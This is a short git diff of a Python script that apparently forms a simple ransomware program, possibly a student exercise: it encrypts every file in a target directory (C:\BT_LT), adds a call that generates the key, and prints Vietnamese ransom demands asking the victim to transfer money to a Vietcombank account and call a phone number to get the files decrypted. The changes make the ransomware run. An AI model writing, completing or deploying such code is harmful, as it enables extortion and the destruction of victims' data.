@@ -25,9 +25,11 @@ def encrypt_directory(directory):
             encrypt_file(file_path, key)
 
 if __name__ == "__main__":
+    generate_key()
+
     print("Tất cả các files đã bị mã hóa.")
     print("Chuyển tiền vào số tài khoản sau: 12121212121, Ngân hàng: Vietcombank nếu muốn giải mã các files!")
     print("Sau khi chuyển tiền, liên hệ SĐT: 0123456789")
     
-    directory_to_encrypt = r"C:\\BT_LT"  # Thay đổi theo đường dẫn thực tế
+    directory_to_encrypt = r"C:\BT_LT"
     encrypt_directory(directory_to_encrypt)
